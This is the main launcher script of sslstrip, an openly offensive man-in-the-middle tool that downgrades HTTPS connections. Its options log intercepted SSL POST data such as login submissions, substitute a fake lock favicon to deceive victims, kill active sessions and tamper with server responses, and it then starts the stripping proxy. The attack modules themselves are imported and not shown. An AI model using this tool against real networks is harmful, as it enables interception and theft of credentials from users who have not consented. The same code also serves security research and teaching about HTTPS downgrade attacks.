#!/usr/bin/env python

"""sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping attacks."""
 
__author__ = "Moxie Marlinspike"
__email__  = "moxie@thoughtcrime.org"
__license__= """
Copyright (c) 2004-2009 Moxie Marlinspike <moxie@thoughtcrime.org>
 
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License as
published by the Free Software Foundation; either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but
WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
USA

"""

from twisted.web import http
from twisted.internet import reactor

from sslstrip.StrippingProxy import StrippingProxy
from sslstrip.URLMonitor import URLMonitor
from sslstrip.CookieCleaner import CookieCleaner
from sslstrip.ResponseTampererFactory import ResponseTampererFactory

import sys, getopt, logging, traceback, string, os

gVersion = "0.9"

def usage():
    print "\nsslstrip " + gVersion + " by Moxie Marlinspike"
    print "Usage: sslstrip <options>\n"
    print "Options:"
    print "-w <filename>, --write=<filename> Specify file to log to (optional)."
    print "-p , --post                       Log only SSL POSTs. (default)"
    print "-s , --ssl                        Log all SSL traffic to and from server."
    print "-a , --all                        Log all SSL and HTTP traffic to and from server."
    print "-l <port>, --listen=<port>        Port to listen on (default 10000)."
    print "-f , --favicon                    Substitute a lock favicon on secure requests."
    print "-k , --killsessions               Kill sessions in progress."
    print "-t <config>, --tamper <config>    Enable response tampering with settings from <config>."
    print "-h                                Print this help message."
    print ""

def parseOptions(argv):
    logFile      = 'sslstrip.log'
    logLevel     = logging.WARNING
    listenPort   = 10000
    spoofFavicon = False
    killSessions = False
    tamperConfigFile = False
    
    try:                                
        opts, args = getopt.getopt(argv, "hw:l:psafkt:", 
                                   ["help", "write=", "post", "ssl", "all", "listen=", 
                                    "favicon", "killsessions", "tamper="])

        for opt, arg in opts:
            if opt in ("-h", "--help"):
                usage()
                sys.exit()
            elif opt in ("-w", "--write"):
                logFile = arg
            elif opt in ("-p", "--post"):
                logLevel = logging.WARNING
            elif opt in ("-s", "--ssl"):
                logLevel = logging.INFO
            elif opt in ("-a", "--all"):
                logLevel = logging.DEBUG
            elif opt in ("-l", "--listen"):
                listenPort = arg
            elif opt in ("-f", "--favicon"):
                spoofFavicon = True
            elif opt in ("-k", "--killsessions"):
                killSessions = True
            elif opt in ("-t", "--tamper"):
                tamperConfigFile = arg

        return (logFile, logLevel, listenPort, spoofFavicon, killSessions, tamperConfigFile)
                    
    except getopt.GetoptError:           
        usage()                          
        sys.exit(2)                         

def main(argv):
    (logFile, logLevel, listenPort, spoofFavicon, killSessions, tamperConfigFile) = parseOptions(argv)
        
    logging.basicConfig(level=logLevel, format='%(asctime)s %(message)s',
                        filename=logFile, filemode='w')

    URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
    CookieCleaner.getInstance().setEnabled(killSessions)
    ResponseTampererFactory.buildTamperer(tamperConfigFile)
    strippingFactory              = http.HTTPFactory(timeout=10)
    strippingFactory.protocol     = StrippingProxy

    reactor.listenTCP(int(listenPort), strippingFactory)
                
    print "\nsslstrip " + gVersion + " by Moxie Marlinspike running..."

    reactor.run()

if __name__ == '__main__':
    main(sys.argv[1:])
